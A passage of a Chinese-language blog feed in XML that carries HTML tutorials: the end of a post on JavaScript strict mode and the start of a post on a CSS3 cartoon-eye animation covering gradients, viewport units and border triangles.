title="2.禁止动态绑定"></a>2.禁止动态绑定</h3><blockquote><p>好处：在编译时就确定属性与方法到底归属哪个对象，有利于编译效率的提高，也有助于代码的阅读。</p></blockquote><p><strong>动态绑定：即某些属性和方法到底属于哪个对象，不是在编译时确定，而是在运行时确定。</strong></p><p>哪些使用了动态绑定？</p><h4 id="1-with语句"><a href="#1-with语句" class="headerlink" title="1.with语句"></a>1.with语句</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj=&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;xiaomi&#x27;</span>,</span><br><span class="line"><span class="attr">count</span>:<span class="number">12</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//使用with语句报错</span></span><br><span class="line"><span class="function"><span class="title">with</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;xiaowang&#x27;</span>,</span><br><span class="line"><span class="attr">sex</span>:<span class="string">&quot;男&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么使用with语句，不确定属性的归属呢？</p><p>很简单，在正常模式下：with绑定的是obj对象，name属性在obj中，而sex不在obj中，则最终会将sex声明为为全局变量。</p><h4 id="2-eval作用域"><a href="#2-eval作用域" class="headerlink" title="2.eval作用域"></a>2.eval作用域</h4><p>正常模式下：eval语句的作用域取决于它处于全局作用域，还是函数作用域。</p><p>严格模式下：eval语句本身就是一个作用域，它生成的变量只能在eval内部使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> name=<span class="string">&#x27;xiaoming&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">eval</span>(<span class="string">&quot;var name=&#x27;xiaohua&#x27;;name&quot;</span>))<span class="comment">//&#x27;xiaohua&#x27;</span></span><br><span class="line"><span class="built_in">console</span>.log(name);<span class="comment">//&#x27;xiaoming&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="3-禁止this指向全局对象，而是指向undefined"><a href="#3-禁止this指向全局对象，而是指向undefined" class="headerlink" title="3.禁止this指向全局对象，而是指向undefined"></a>3.禁止this指向全局对象，而是指向undefined</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name=<span class="string">&quot;xiaoming&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">this</span>.name);<span class="comment">//&#x27;xiaoming&#x27;，this指向window</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">this</span>.name);<span class="comment">//抛出错误，因为this为undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-禁止删除变量"><a href="#4-禁止删除变量" class="headerlink" title="4.禁止删除变量"></a>4.禁止删除变量</h3><p><strong>严格模式下，声明的变量无法被删除</strong>。</p><p>但<strong>对象中的属性</strong>，若设置了<code>configurable:true</code>，那么这个对象的属性是可以被删除的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> name;</span><br><span class="line"><span class="keyword">delete</span> name; <span class="comment">// 语法错误</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.create(<span class="literal">null</span>, &#123;<span class="string">&#x27;count&#x27;</span>: &#123;</span><br><span class="line"><span class="attr">value</span>: <span class="number">1</span>,</span><br><span class="line"><span class="attr">configurable</span>: <span class="literal">true</span></span><br><span class="line">&#125;&#125;);</span><br><span class="line"><span class="keyword">delete</span> obj.count; <span class="comment">// 删除成功</span></span><br></pre></td></tr></table></figure><h3 id="5-禁止了不在脚本或者函数层面上的函数声明"><a href="#5-禁止了不在脚本或者函数层面上的函数声明" class="headerlink" title="5.禁止了不在脚本或者函数层面上的函数声明"></a>5.禁止了不在脚本或者函数层面上的函数声明</h3><p>所谓的顶层是在全局中声明，即在块作用域中声明是错误的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; &#125; <span class="comment">// !!! 语法错误</span></span><br><span class="line">  f();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>) </span>&#123; &#125; <span class="comment">// !!! 语法错误</span></span><br><span class="line">  f2();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">baz</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 合法</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eit</span>(<span class="params"></span>) </span>&#123; &#125; <span class="comment">// 同样合法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-禁止变量或函数参数重名"><a href="#6-禁止变量或函数参数重名" class="headerlink" title="6.禁止变量或函数参数重名"></a>6.禁止变量或函数参数重名</h3><p>重名：在同一作用域，两个或两个以上变量名相同。</p><p><strong>正常模式下，如果对象有多个重名属性，那么最后一个会覆盖前面的值。</strong></p><p>但在严格模式下这是会报错的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> obj=&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&quot;xiaoming&quot;</span>,</span><br><span class="line"><span class="attr">name</span>:<span class="string">&quot;xiaohua&quot;</span></span><br><span class="line">&#125;;<span class="comment">//报错</span></span><br></pre></td></tr></table></figure><p>正常模式下：在函数参数中，如果参数有重名情况，我们可以使用<code>arguments[i]</code>读取参数，以便区分参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a,b,b,c</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">0</span>]);<span class="comment">//a</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">1</span>]);<span class="comment">//第一个b</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">2</span>]);<span class="comment">//第二个b</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">3</span>]);<span class="comment">//c</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面重复参数名，在严格模式下报错。</p><h3 id="7-限制了arguments对象"><a href="#7-限制了arguments对象" class="headerlink" title="7.限制了arguments对象"></a>7.限制了arguments对象</h3><h4 id="1-不允许对arguments赋值"><a href="#1-不允许对arguments赋值" class="headerlink" title="1.不允许对arguments赋值"></a>1.不允许对arguments赋值</h4><p>正常模式下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;赋值前：&quot;</span>,<span class="built_in">arguments</span>)</span><br><span class="line">    <span class="built_in">arguments</span>=<span class="number">12</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;赋值后：&quot;</span>,<span class="built_in">arguments</span>)</span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>严格模式下会报错。</p><h4 id="2-arguments不再跟踪参数的变化"><a href="#2-arguments不再跟踪参数的变化" class="headerlink" title="2.arguments不再跟踪参数的变化"></a>2.arguments不再跟踪参数的变化</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">    a=<span class="number">11</span>;</span><br><span class="line">    b=<span class="number">22</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">arguments</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;正常模式下：&quot;</span>,foo(<span class="number">1</span>,<span class="number">2</span>));<span class="comment">//Arguments(2) [11, 22, callee: ƒ, Symbol(Symbol.iterator): ƒ]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line"><span class="meta">    &quot;use strict&quot;</span>;</span><br><span class="line">    a=<span class="number">33</span>;</span><br><span class="line">    b=<span class="number">44</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">arguments</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;严格模式下：&quot;</span>,bar(<span class="number">3</span>,<span class="number">4</span>));<span class="comment">//Arguments(2) [3, 4, callee: (...), Symbol(Symbol.iterator): ƒ]</span></span><br></pre></td></tr></table></figure><p>严格模式下，a,b已经重新赋值，但是arguments没有记录它们的变化。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;严格模式&quot;&gt;&lt;a href=&quot;#严格模式&quot; class=&quot;headerlink&quot; title=&quot;严格模式&quot;&gt;&lt;/a&gt;严格模式&lt;/h1&gt;&lt;h2 id=&quot;严格模式的理解&quot;&gt;&lt;a href=&quot;#严格模式的理解&quot; class=&quot;headerlink&quot; title=&quot;严格模</summary>
      
    
    
    
    <category term="JS" scheme="https://lesliewaong.top/categories/JS/"/>
    
    
    <category term="严格模式" scheme="https://lesliewaong.top/tags/%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F/"/>
    
    <category term="普通模式" scheme="https://lesliewaong.top/tags/%E6%99%AE%E9%80%9A%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>纯CSS3实现卡通人物眼睛的动画特效</title>
    <link href="https://lesliewaong.top/posts/6bfa7aba.html"/>
    <id>https://lesliewaong.top/posts/6bfa7aba.html</id>
    <published>2022-02-16T02:12:32.000Z</published>
    <updated>2022-03-23T15:16:58.809Z</updated>
    
    <content type="html"><![CDATA[<h1 id="纯CSS3实现卡通人物眼睛的动画特效"><a href="#纯CSS3实现卡通人物眼睛的动画特效" class="headerlink" title="纯CSS3实现卡通人物眼睛的动画特效"></a>纯CSS3实现卡通人物眼睛的动画特效</h1><h2 id="项目展示"><a href="#项目展示" class="headerlink" title="项目展示"></a>项目展示</h2><p><a href="https://lesliewaong.top/item/Naruto/">展示地址</a></p><blockquote><p>展示动图</p></blockquote><p><a href="https://imgtu.com/i/HWV49x"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/02/15/HWV49x.gif" alt="HWV49x.gif"></a></p><p>注意：</p><ul><li>对移动端进行了自适应。</li><li>鼠标移入三勾玉或轮回圈部分有动画。</li><li>在苹果的设备上会有展示bug， <code>drop-shadow()</code>在轮回眼上无法生效。</li><li>Web端无法使用缩放功能。</li></ul><h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><ul><li>自适应布局 <code>vw,vh</code></li><li>三角形胡须  利用<code>border</code>画三角形</li><li>眼睛 使用<code>box-shadow</code>和<code>border-radius</code>可以获得类似<strong>边框</strong>的效果。filter眼影</li><li>居中 <code>absolute + transform</code> <code>Flex</code></li><li>写轮眼 轮回眼 <code>animation</code> <code>transform</code> <code>opacity</code> <code>absolute</code></li></ul><h2 id="背景渐变"><a href="#背景渐变" class="headerlink" title="背景渐变"></a>背景渐变</h2><h3 id="线性渐变（linear-gradient）"><a href="#线性渐变（linear-gradient）" class="headerlink" title="线性渐变（linear-gradient）"></a>线性渐变（linear-gradient）</h3><p>基础用法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background</span>:<span class="built_in">linear-gradient</span>(angle,start-color,soft-line,end-color);</span><br></pre></td></tr></table></figure><ul><li><p><strong>angle</strong>是渐变角度，不写则默认从上到下，也就是<code>to bottom</code>，当然其他类似的直角方向还有<code>to right</code>,<code>to top</code>,<code>to left</code>。其他的对角方向包括<code>to left top</code>,<code>to right top</code>,<code>to bottom right</code>,<code>to bottom left</code>。需要注意的是：对角线角度的单词顺序<strong>不讲究顺序</strong>，<code>to bottom right</code>和<code>to right bottom</code>是一样的意思。</p></li><li><p><strong>start-color &amp;&amp; end-color</strong>表示起始色标和终止色标，支持16进制颜色（如”<code>#85e96c</code>“），h5示例颜色（如”<code>aqua</code>“），rgb（如”<code>rgb(133, 233, 108)</code>“），rgba（”<code>rgba(133, 233, 108,.5)</code>“）、<code>transparent</code>。</p></li><li><p><strong>soft-line</strong>:柔性分界。不写则默认50%。表示两种颜色过渡的柔和边界，不是硬性边界。</p></li><li><p>如果想写一条硬线，也就是所谓的<code>hard line</code>来进行无渐变分割，则在两个色标尾部紧接着写上50%，注意，除了50%其他都不能完全消除渐变效果。这是一个去渐变的硬线分割写法。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background</span>:<span class="built_in">linear-gradient</span>(<span class="number">#fc4a09</span> <span class="number">50%</span>,<span class="number">#f7d1ab</span>  <span class="number">50%</span>);</span><br></pre></td></tr></table></figure></li></ul><h3 id="径向渐变（radial-gradient）"><a href="#径向渐变（radial-gradient）" class="headerlink" title="径向渐变（radial-gradient）"></a>径向渐变（radial-gradient）</h3><p>基础语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background</span>:<span class="built_in">radial-gradient</span>(shape,start-color, soft-line,end-color );</span><br></pre></td></tr></table></figure><ul><li><p><strong>shape</strong>即渐变的形状，不写则为默认的<code>ellipse椭圆</code>，可以改为<code>circle正圆</code>。与其它渐变相同，<strong>径向渐变是一个不固定尺寸的图像，即，它没有首选的大小，也没有首选的比例</strong>。具体大小将由它所应用的元素的大小决定。</p></li><li><p>其他参数的含义（<code>start-color</code>,<code>end-color</code>,<code>soft-line</code>），包括硬线的实现代码，配合背景图使用的写法，<strong>都与线性渐变的几个同名参数或同名操作完全相同</strong>。</p></li></ul><h2 id="自适应布局单位vw-vh"><a href="#自适应布局单位vw-vh" class="headerlink" title="自适应布局单位vw,vh"></a>自适应布局单位vw,vh</h2><h3 id="视口单位-Viewport-units"><a href="#视口单位-Viewport-units" class="headerlink" title="视口单位(Viewport units)"></a>视口单位(Viewport units)</h3><blockquote><p>什么是视口？ </p></blockquote><p>视口 (viewport) 代表当前可见的计算机图形区域。在 <strong>Web 浏览器</strong>术语中，<strong>通常与浏览器窗口相同</strong>，但不包括浏览器的UI， 菜单栏等——即指你正在浏览的文档的那一部分。</p><p>文档，比如这篇文章，可能会非常长。你的viewport 就是你现在所能见到的所有事物。值得注意的是“什么是视口区域”这个问题，页面中的一些导航菜单也包括在其中。<strong>Viewport 的大小取决于屏幕的大小，无论浏览器是否处于全屏模式，是否被用户缩放了。</strong>Viewport 外的区域，比如这个文档的See Also部分，可能需要滚动到其所在的区域才会出现在屏幕上。</p><ul><li>在尺寸较大的设备中，在这些设备上，<strong>应用显示区域不一定是全屏的，viewport 是浏览器窗口的大小</strong>。</li><li>在大多数移动设备中，<strong>浏览器是全屏的</strong>，<strong>viewport 是整个屏幕的大小</strong>。</li><li>在全屏模式下，viewport 是设备屏幕的范围，窗口是浏览器窗口，浏览器窗口大小小于或等于视口的大小，并且文档是这个网站，文档的大小可比 viewport 长或宽。</li></ul><p>概括地说，<strong>viewport 基本上是当前文档的可见部分</strong>。</p><p>Web 浏览器包含两个 viewport，<strong>布局视口 (layout viewport)</strong> 和**视觉视口 (visual viewport)**。visual viewport 指当前浏览器中可见的部分，并且可以变化。当使用触屏双指缩放，当动态键盘在手机上弹出的时候，或者之前隐藏的地址栏变得可见的时候，visual viewport 缩小了，但是 layout viewport 却保持不变。</p><p>在上面描述的布局视口 (layout viewport) 和视觉视口 (visual viewport) 不是您将遇到的唯一视口。 在布局视口中完全或部分显示的任何子视口都被视为可视视口。</p><p>我们通常认为宽度和高度的媒体查询是相对于浏览器窗口的宽度和高度而言的。 <strong>它们实际上是相对于视口的</strong>，即<strong>主文档（document）中的窗口（window对象）</strong>，但它也是<strong>嵌套浏览上下文（如对象，iframe和SVG）中元素父级的本身的大小</strong>。 在CSS中，我们也有基于视口大小的长度单位。 <code>1vh</code> 单位是 <code>1%</code> 布局视口的高度，<code>vw</code> 单位与此类似。</p><p>对于一个 <code>iframe</code> 来说，视觉视口是其内部高度和宽度的大小而不是其父文档的大小。你可以为其高度和宽度设置任意数值，但过大的值可能会使 <code>iframe</code> 部分内容超出视口导致超出部分不可见。</p><p>视口单位主要包括以下4个：</p><ul><li><strong>vw</strong>：1vw等于视口宽度的1%。</li><li><strong>vh</strong>：1vh等于视口高度的1%。</li><li><strong>vmin</strong>：选取vw和vh中最小的那个。</li><li><strong>vmax</strong>：选取vw和vh中最大的那个。</li></ul><h3 id="vh-vw与-区别"><a href="#vh-vw与-区别" class="headerlink" title="vh/vw与%区别"></a>vh/vw与%区别</h3><p> <strong>vh and vw：相对于视口的高度和宽度，而不是父元素的</strong>（<strong>CSS百分比是相对于包含它的最近的父元素的高度和宽度</strong>）。</p><h3 id="兼容性问题"><a href="#兼容性问题" class="headerlink" title="兼容性问题"></a>兼容性问题</h3><p>在移动端 iOS 8 以上以及 Android 4.4 以上获得支持，并且在微信 x5 内核中也得到完美的全面支持。</p><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>用户失去了放缩任何使用<code>vw</code>单位的元素的能力。</p><h2 id="border"><a href="#border" class="headerlink" title="border"></a>border</h2><p>一个用于设置各种单独的边界属性的简写属性。</p><p><code>border</code>可以用于设置一个或多个以下属性的值: <code>border-width</code>, <code>border-style</code>, <code>border-color</code></p><h3 id="利用border画三角形"><a href="#利用border画三角形" class="headerlink" title="利用border画三角形"></a>利用border画三角形</h3><p>本质还是利用了盒模型，<strong>每个边框都是梯形</strong>，当<strong>内容区宽高为0</strong>时就成三角形。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSS三角形<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">body</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">77</span>, <span class="number">80</span>, <span class="number">79</span>);</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.div1</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">border</span>: <span class="number">125px</span> solid transparent;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-left-color</span>: aqua;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.div2</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-top</span>: <span class="number">125px</span> solid transparent;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-bottom</span>: <span class="number">125px</span> solid <span class="built_in">rgb</span>(<span class="number">36</span>, <span class="number">15</span>, <span class="number">153</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-left</span>: <span class="number">125px</span> solid transparent;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-right</span>: <span class="number">125px</span> solid transparent;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.div3</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-top</span>: <span class="number">125px</span> solid transparent;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-bottom</span>: <span class="number">125px</span> solid <span class="built_in">rgb</span>(<span class="number">153</span>, <span class="number">15</span>, <span class="number">45</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-left</span>: <span class="number">125px</span> solid transparent;</span></span><br><span class="line"><span class="css">            <span class="comment">/* border-right: 125px solid transparent; */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.div4</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-top</span>: <span class="number">250px</span> solid <span class="built_in">rgb</span>(<span class="number">15</span>, <span class="number">153</span>, <span class="number">61</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-left</span>: <span class="number">125px</span> solid transparent;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-right</span>: <span class="number">125px</span> solid transparent;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.div5</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">600px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">80px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: white;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.div5</span><span class="selector-pseudo">::after</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">            <span class="attribute">right</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">top</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">50%</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border</span>: <span class="number">20px</span> solid transparent;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-top-color</span>:  white;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div5&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果图：</p><p><a href="https://imgtu.com/i/7m1wcj"><img src= 